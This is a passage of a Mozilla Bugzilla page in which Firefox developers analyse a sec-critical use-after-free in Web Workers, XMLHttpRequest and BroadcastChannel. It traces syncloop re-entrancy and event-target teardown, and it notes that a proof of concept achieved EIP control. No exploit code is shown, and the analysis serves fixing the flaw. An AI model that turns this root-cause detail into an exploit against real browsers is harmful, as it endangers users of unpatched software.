gets processed and the logic in BroadcastChannelChild::RecvNotify&#39;s that<br>
calls only DOMEventTargetHelper::CheckCurrentGlobalCorrectness() to check<br>
the state of the worker ends up confused and dispatches an event that<br>
should never have been dispatched.  (Although <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1455020" title="RESOLVED FIXED - Extend CheckInnerWindowCorrectness() to check the state of the worker.">bug 1455020</a> was notionally<br>
concerned about this when it renamed the method, it only added an<br>
mParentObject check.  This check is really a check of whether<br>
WorkerGlobalScope::NoteTerminating() has been invoked which then calls<br>
DisconnectEventTargetObjects().  But NoteTerminating is only called when<br>
WorkerPrivate::NotifyInternal is invoked with a status &gt;= Canceling, which<br>
Close is not.  (And as noted above, the cancelling state is deferred.  It<br>
only runs when DestroySyncLoop has returned from ClearMainEventQueue()!)).</li>
</ul>
</li>
</ul>
<h2>What Invariants Are Going Wrong</h2>
<ul>
<li>BroadcastChannel is dispatching events when it should not be.  This is the<br>
primary invariant violation here, as it&#39;s allowing content to be invoked on<br>
the stack when it&#39;s absolutely not expected to be invoked on the stack.  It&#39;s<br>
depending on one of the following things to protect it:
<ul>
<li>Being wrapped into a WorkerRunnable so it gets canceled instead of run.<br>
(It&#39;s not because it&#39;s IPC and it&#39;s not using the hybrid event target.)
<ul>
<li>The control flow for canceling WorkerRunnables is extra insane, as it<br>
depends on WorkerRunnable::Run() noticing that<br>
WorkerPrivate::AllPendingRunnablesShouldBeCanceled() returns true.  Normal<br>
runnables just run.</li>
<li>Unfortunately event hybrid event target wrapping is semantically<br>
problematic because it coerces the normal runnables into control<br>
runnables.</li>
</ul>
</li>
<li>Having DOMEventTargetHelper protect it from dispatching the event.  (It&#39;s<br>
not because DOMEventTargetHelper&#39;s guard is only effective once the worker<br>
has reached the Canceling state, which it has not because the event is<br>
being invoked inside the syncloop destruction which will only advance to<br>
the canceling state after the event loop is drained.)
<ul>
<li>It is reasonable to enforce that ClearMainEventQueue should preclude<br>
event dispatch to occur while clearing the queue.  We should either fail<br>
to dispatch or crash.  It&#39;s arguably reasonable to enforce this at both<br>
the DETH level as well as the global level.</li>
<li>From a semantics level, it makes sense to explicitly have checks for<br>
whether it&#39;s currently legal to call into content and whether it&#39;s legal<br>
to enqueue tasks.  Unfortunately, both self.close() and syncloops throw<br>
wrenches into clear state transitions here.  close() definitely precludes<br>
future task enqueueing.  And syncloop unwinding definitely creates<br>
intervals where calls into content are indicative of fatal invariant<br>
violations (specifically, when clearing the event queue).</li>
</ul>
</li>
</ul>
</li>
<li>DestroySyncLoop isn&#39;t preventing reentrancy into the mSyncLoopStack.IsEmpty()<br>
actions, although, again, it&#39;s the calls into content that are forcing the<br>
issue.
<ul>
<li>The double-dispatch of the CancelingRunnables is notionally idempotent and<br>
okay in terms of reference counting, it&#39;s really just the event loop<br>
clearing that causes issues.</li>
</ul>
</li>
<li>XMLHttpRequestWorker.cpp&#39;s EventRunnable::WorkerRun takes a copy of<br>
mProxy&#39;s raw, non-owning pointer and passes it onwards to<br>
ProgressEvent::Constructor or NS_NewDOMEvent, both of whom derive an owning<br>
RefPtr or nsCOMPtr.  This enables a use-after-free on XMLHttpRequestWorker in<br>
the event of apparent event reordering.  This is a thing that&#39;s possible when<br>
you have re-entrancy of syncloop destruction/content invocation on top of a<br>
syncloop, as this cancels all runnables after the current runnable when our<br>
invariants expect this to be impossible, allowing naive assumptions of<br>
strong-refs being held by things that can only be deleted chronologically in a<br>
future turn of the event loop being violated.
<ul>
<li>NB: I need to explain this better.  To restate somewhat more explicitly:<br>
sync calls from workers assume that no content re-entrancy can occur.  The<br>
whole point of the nested event queues and syncloops is that no content<br>
re-entrancy ever occurs.  This limits the ability to create mismatched<br>
ownership situations because any GC or strong references on the stack before<br>
the code went synchronous continue to exist.</li>
</ul>
</li>
</ul>
<h2>So The (Non)Action Items</h2>
<ul>
<li>The IPC/runnable issue is important but hard to address because of the<br>
divergence between what the Cache API expects in terms of semantics (IPC is<br>
chrome privileged) and what implementations like BroadcastChannel expect<br>
(IPC is content privileged, roughly speaking).</li>
<li>Preventing calls into content JS when no longer appropriate is therefore<br>
paramount.  This can be addressed from multiple sides:
<ul>
<li>ClearEventQueue can 100% inhibit calls into JS by DETH or any code until<br>
explicitly cleared.</li>
<li>DOMEventTargetHelper can be made to understand when it is being used in a<br>
context that is explicitly synchronously reentrant from content, versus when<br>
it is being used in an explicitly asynchronous fashion.  This is a unique<br>
distinction for workers, but a necessary and fundamental distinction in the<br>
face of <code>self.close()</code>.  APIs such as BroadcastChannel and MessageChannel<br>
have explicitly async dispatches (at least for our IPC handlers; there<br>
may be some edge-cases for MessageChannels for freshly created channels that<br>
haven&#39;t had their ports shipped/entangled/etc.).  In these cases, any<br>
attempt shoudl 100% fail after self.close() is called.  The only wackiness<br>
we allow with sync XHR/etc. is that the stack be unwound.  No further<br>
tasks should ever get to run.</li>
</ul>
</li>
<li>The syncloop reentrancy/mPostSyncLoopOperations-double-invocation needs harder<br>
guards that ensure we aren&#39;t allowed to start a new syncloop while popping the<br>
current one.  A lesser option would be to reorder the stack consultation so<br>
that we noticed we&#39;re at 1 to sensitize for the call but don&#39;t actually pop<br>
down to 0 until the return, which would result in the nested seeing a 2-&gt;1<br>
transition instead of an additional, duplicative 1-&gt;0 transition, but it&#39;s<br>
really not okay to be pushing an additional syncloop.  (Syncloops should only<br>
be allowed to be entered when in content, but it&#39;s not okay to be in content<br>
at that time.)</li>
</ul>
<p>I&#39;ll attempt to get a candidate set of fixes with appropriate reproduction confirmations of this tomorrow.  (That is, the reproduction should properly trigger failsafe assertions in the initial draft of the patch, and then the reproduction should only generate errors in the second draft of the patch wherein the invariants are properly guarded against without triggering the backstop crashing assertions.)  This may spill into Friday as I try and better validate that I understand how the actual use-after-free is occurring.</p>
</div><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(bugmail)</span></div></div></div><div class="change-set" id="a9682275_151407"><div class="change" id="aa9682275_151407">
    <table class="layout-table change-head assignee" role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_151407" id="a9682275_151407"><img src="https://secure.gravatar.com/avatar/75b1e0d00a677e73b24efe34917fa1e9?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_151407" id="a9682275_151407"><a class="email " href="/user_profile?user_id=151407" > <span class="fna">Andrew Sutherland [:asuth] (he/him)</span></a>
</div>
            <span class="user-role">Assignee</span>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a9682275_151407"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a9682275_151407">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1545345#a9682275_151407">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-08-07 23:15 PDT" data-time="1565244950">2 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Priority: P2 &rarr; P1</div></div></div><div class="change-set" id="c14"><div class="comment" data-id="14295243" data-no="14"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-14" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_1689" id="a9682275_151407"><img src="https://secure.gravatar.com/avatar/da6b54ad3fdb36ba7656df9adfe65d12?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_1689" id="a9682275_151407"><a class="email " href="/user_profile?user_id=1689" > <span class="fna">Daniel Veditz [:dveditz]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-14"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-14" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1545345#c14">Comment 14</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-08-12 10:00 PDT" data-time="1565629246">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-14">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-14" data-comment-id="14295243" data-ismarkdown="true" ><p>re-rating sec-critical based on <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1545345#c2" title="RESOLVED FIXED - Web Workers - Use After Free with XMLHttpRequest">comment 2</a>&#39;s PoC (EIP control, not just ASAN detection)</p>
</div><div class="activity"><div class="change">Keywords: <a href="/buglist.cgi?keywords=sec-high&amp;resolution=---">sec-high</a> &rarr; <a href="/buglist.cgi?keywords=sec-critical&amp;resolution=---">sec-critical</a></div></div></div><div class="change-set" id="a10066705_1689"><div class="change" id="aa10066705_1689">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_1689" id="a10066705_1689"><img src="https://secure.gravatar.com/avatar/da6b54ad3fdb36ba7656df9adfe65d12?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_1689" id="a10066705_1689"><a class="email " href="/user_profile?user_id=1689" > <span class="fna">Daniel Veditz [:dveditz]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a10066705_1689"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a10066705_1689">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1545345#a10066705_1689">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-08-12 10:03 PDT" data-time="1565629380">2 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Duplicate of this bug: <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED DUPLICATE"
   href="/show_bug.cgi?id=1547059">1547059</a></div></div></div><div class="change-set" id="a10066826_1689"><div class="change" id="aa10066826_1689">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_1689" id="a10066826_1689"><img src="https://secure.gravatar.com/avatar/da6b54ad3fdb36ba7656df9adfe65d12?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_1689" id="a10066826_1689"><a class="email " href="/user_profile?user_id=1689" > <span class="fna">Daniel Veditz [:dveditz]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a10066826_1689"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a10066826_1689">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1545345#a10066826_1689">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-08-12 10:05 PDT" data-time="1565629501">2 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Flags: sec-bounty? &rarr; sec-bounty+</div></div></div><div class="change-set" id="c16"><div class="comment" data-id="14298799" data-no="16"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-16" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_151407" id="a10066826_1689"><img src="https://secure.gravatar.com/avatar/75b1e0d00a677e73b24efe34917fa1e9?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_151407" id="a10066826_1689"><a class="email " href="/user_profile?user_id=151407" > <span class="fna">Andrew Sutherland [:asuth] (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-16"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-16" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1545345#c16">Comment 16</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-08-13 21:08 PDT" data-time="1565755683">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-16">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-16" data-comment-id="14298799" data-ismarkdown="true" ><p>I&#39;m experiencing difficulty right now reproducing on nightly under linux64 opt, debug, or opt asan under both reproduction test cases including with a release assert on calling into JS content when ClearMainEventQueue and running asan and opt under rr (primarily attempting to offset my fast multi-core machine by serializing execution).  And this includes running multiples tabs concurrently.</p>
<p>We did correct our worker thread priority from being below-normal to normal though (which I think is a significant priority difference on windows), so it&#39;s likely we&#39;ve made it harder to reproduce the exact situation in question.</p>
<p>Tomorrow I&#39;ll endeavor to create a variation that just spams BroadcastChannel messages to trigger content re-entrancy in syncloop unwinding after self.close() is involved.  That should be sufficient to validate the hard backstop content re-entrancy guards and the broadcast channel DOMEventTargetHelper guards.  Once that&#39;s working (and those guards disabled again) it should be simple enough to expose an oracle to content to let it know when to trigger a nested syncloop and to verify we avoid attempting to perform the last-syncloop actions twice.</p>
</div></div><div class="change-set" id="c17"><div class="comment" data-id="14298803" data-no="17"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-17" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_151407" id="a10066826_1689"><img src="https://secure.gravatar.com/avatar/75b1e0d00a677e73b24efe34917fa1e9?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_151407" id="a10066826_1689"><a class="email " href="/user_profile?user_id=151407" > <span class="fna">Andrew Sutherland [:asuth] (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-17"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-17" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1545345#c17">Comment 17</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-08-13 21:11 PDT" data-time="1565755904">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-17">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-17" data-comment-id="14298803" data-ismarkdown="true" ><p>I&#39;ll also pursue local windows builds since that&#39;s the platform of greatest concern.  Also if anyone has any recent reproduction backtraces on hand, please do paste/attach them to the bug as it would be useful to help account for code drift.  (But no need to go out of your way.  It&#39;s clear the content re-entrancy issues continues to exist even if it&#39;s somewhat harder to reproduce them.)</p>
</div></div><div class="change-set" id="c18"><div class="comment" data-id="14315184" data-no="18"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-18" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_151407" id="a10066826_1689"><img src="https://secure.gravatar.com/avatar/75b1e0d00a677e73b24efe34917fa1e9?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_151407" id="a10066826_1689"><a class="email " href="/user_profile?user_id=151407" > <span class="fna">Andrew Sutherland [:asuth] (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-18"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-18" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1545345#c18">Comment 18</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-08-21 22:50 PDT" data-time="1566453042">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-18">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-18" data-comment-id="14315184" data-ismarkdown="true" ><p>Status update:</p>
<ul>
<li>Reproducing BroadcastChannel re-entrancy is in fact very easy.  I created a mochitest for reproduction assistance.</li>
<li>Reproducing the GC problem that led to the crash has been harder against trunk, so I&#39;m planning to reproduce on the original revision and then potentially bisect a bit.
<ul>
<li>In my <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1545345#c13" title="RESOLVED FIXED - Web Workers - Use After Free with XMLHttpRequest">comment 13</a> analysis I was overly focused on the re-entrancy invariants and that Yaron&#39;s ASAN repro provided evidence of this, but I&#39;m still trying to reconstruct how we could end up with both an XMLHttpRequestWorker in the snow-white list that gets MaybeKillObject()ed (meaning it has a 0 refcount at the time of deletion) as well as have the dom::Event whose underlying WidgetEvent has an nsCOMPtr reference to the same XMLHttpRequestWorker itself be in the snow-white list.  By rolling back to the code at the time of a known repro, I hope to reproduce under rr/pernosco and then leverage that to create a more targeted reproducing test and verify how that applies to trunk through the impending release.</li>
</ul>
</li>
</ul>
</div></div><div class="change-set" id="c19"><div class="comment" data-id="14316828" data-no="19"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-19" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_75935" id="a10066826_1689"><img src="https://secure.gravatar.com/avatar/a10f7f199c75a9a5a1eb347730524a7a?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_75935" id="a10066826_1689"><a class="email " href="/user_profile?user_id=75935" > <span class="fna">Ryan VanderMeulen [:RyanVM]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-19"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-19" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1545345#c19">Comment 19</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-08-22 14:00 PDT" data-time="1566507627">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-19">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-19" data-comment-id="14316828" data-ismarkdown="true" ><p>We can&#39;t realistically get a safe fix for this for Fx69 ahead of next week&#39;s RC, so updating the flags accordingly.</p>
</div><div class="activity"><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox69&amp;o1=isnotempty">status-firefox69</a>:
          <a href="/buglist.cgi?f1=cf_status_firefox69&amp;o1=equals&amp;v1=affected">affected</a> &rarr; <a href="/buglist.cgi?f1=cf_status_firefox69&amp;o1=equals&amp;v1=wontfix">wontfix</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox70&amp;o1=isnotempty">status-firefox70</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_status_firefox70&amp;o1=equals&amp;v1=affected">affected</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_tracking_firefox70&amp;o1=isnotempty">tracking-firefox70</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_tracking_firefox70&amp;o1=equals&amp;v1=%2B">+</a></div></div></div><div class="change-set" id="c20"><div class="comment" data-id="14316847" data-no="20"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-20" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_151407" id="a10066826_1689"><img src="https://secure.gravatar.com/avatar/75b1e0d00a677e73b24efe34917fa1e9?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_151407" id="a10066826_1689"><a class="email " href="/user_profile?user_id=151407" > <span class="fna">Andrew Sutherland [:asuth] (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-20"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-20" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1545345#c20">Comment 20</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-08-22 14:08 PDT" data-time="1566508088">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-20">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-20" data-comment-id="14316847" data-ismarkdown="true" ><p>I&#39;ve reproduced on the old build under ASAN, but naive efforts at reproducing under rr chaos and non-chaos didn&#39;t immediately work, so I&#39;ll be iterating a little bit.</p>
</div></div><div class="change-set" id="c21"><div class="comment" data-id="14329436" data-no="21"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-21" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_151407" id="a10066826_1689"><img src="https://secure.gravatar.com/avatar/75b1e0d00a677e73b24efe34917fa1e9?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_151407" id="a10066826_1689"><a class="email " href="/user_profile?user_id=151407" > <span class="fna">Andrew Sutherland [:asuth] (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-21"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-21" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1545345#c21">Comment 21</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-08-28 19:51 PDT" data-time="1567047083">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-21">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-21" data-comment-id="14329436" data-ismarkdown="true" ><p>Got a variant on the test to reproduce on the old code under rr and am currently analyzing in pernosco via pernosco-submit.</p>
</div></div><div class="change-set" id="c22"><div class="comment" data-id="14331768" data-no="22"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-22" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_151407" id="a10066826_1689"><img src="https://secure.gravatar.com/avatar/75b1e0d00a677e73b24efe34917fa1e9?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_151407" id="a10066826_1689"><a class="email " href="/user_profile?user_id=151407" > <span class="fna">Andrew Sutherland [:asuth] (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-22"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-22" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1545345#c22">Comment 22</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-08-29 21:21 PDT" data-time="1567138899">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-22">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-22" data-comment-id="14331768" data-ismarkdown="true" ><p>Okay, wow.</p>
<p><a href="https://pernos.co/debug/Op7WisIFoj25NC1245b9Cw/index.html#f%7Bm%5BBNhV,fvs_,t%5BsA,UXg_,f%7Be%5BBNhV,fvI_,s%7Baf4mB4IAA,bAdQ,oDXIuoQ,uDWRuTA" rel="nofollow">https://pernos.co/debug/Op7WisIFoj25NC1245b9Cw/index.html#f{m[BNhV,fvs_,t[sA,UXg_,f{e[BNhV,fvI_,s{af4mB4IAA,bAdQ,oDXIuoQ,uDWRuTA</a>___</p>
<p>nsIGlobalObject::DisconnectEventTargetObjects in WorkerGlobalScope::NoteTerminating in WorkerPrivate::ProcessAllControlRunnablesLocked in WorkerPrivate::InterruptCallback in JSContext::handleInterrupt in JS callstack in BC::Msg DispatchEvent in DestroySyncLoop/ClearMainEventQueue in XHRW::Send/SendInternal in BC::Msg in Destroy/Clear in XHRW::Send/SendI in BC::Msg ETC ETC</p>
<p>The key things here are:</p>
<ul>
<li>We have a sync event dispatch on the stack into JS space.  The dispatch to the target does not have a kung fu death grip and assumes that mProxy continues to hold a strong ref to the XHRW.</li>
<li>WE ARE PROCESSING CONTROL RUNNABLES IN THE MIDDLE OF ARBITRARY JS CONTENT IN THE INTERRUPT CALLBACK.</li>
<li>WE ARE DISCONNECTING THE EVENT TARGETS IN THE MIDDLE OF SYNCHRONOUS EVENT DISPATCH.</li>
</ul>
<p>Some of these things are concerning.  I leave it as an exercise to the reader to infer which ones most terrifyingly are violating invariants...</p>
<p>Note that the intents here I think are reasonable.  We do want to ensure that an infinite looping worker can be terminated by its parent/owner.  That&#39;s absolutely reasonable.  However, much like the syncloop semantics that defer the actual ramifications of self.close() until the stack is successfully unwound, we should not be actually undertaking the teardown of the global in this manner while we have potentially multiple syncloops on the stack as well as event dispatch.  (However, it&#39;s fine to ensure that all JS content frames for the global immediately error all the way up the stack... the idea is just that much like the cycle collector hygienically defers the actual deletion of objects, it&#39;s wiser for us to defer DETH-disconnect and strong reference dropping until there&#39;s no longer any content and naive C++ frames on the stack.  Although we should ensure kung fu grips are held in places where they aren&#39;t currently held but should be held...)</p>
<p>The particular test I used to reproduce this problem has also resulted in the given scenario happening inside asymmetrically paired Pin/Unpin calls, so that may also be involved or the dominant issue.  I&#39;ll look into that tomorrow as well.</p>
</div></div><div class="change-set" id="c23"><div class="comment" data-id="14379653" data-no="23"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-23" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_451704" id="a10066826_1689"><img src="https://secure.gravatar.com/avatar/6168ea97fda0cefa449331e59b24e8f7?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_451704" id="a10066826_1689"><a class="email " href="/user_profile?user_id=451704" > <span class="fna">Liz Henry (:lizzard Please n-i to RyanVM, jcristau, or pascal)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-23"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-23" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1545345#c23">Comment 23</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-09-23 15:41 PDT" data-time="1569278496">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-23">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-23" data-comment-id="14379653" data-ismarkdown="true" ><p>Andrew - are you still working on this issue? Anyone else you could pull into it for help?</p>
</div><div class="activity"><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox71&amp;o1=isnotempty">status-firefox71</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_status_firefox71&amp;o1=equals&amp;v1=affected">affected</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_tracking_firefox71&amp;o1=isnotempty">tracking-firefox71</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_tracking_firefox71&amp;o1=equals&amp;v1=%2B">+</a></div><div class="change">Flags: needinfo?(bugmail)</div></div></div><div class="change-set" id="c24"><div class="comment" data-id="14380912" data-no="24"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-24" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_151407" id="a10066826_1689"><img src="https://secure.gravatar.com/avatar/75b1e0d00a677e73b24efe34917fa1e9?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_151407" id="a10066826_1689"><a class="email " href="/user_profile?user_id=151407" > <span class="fna">Andrew Sutherland [:asuth] (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

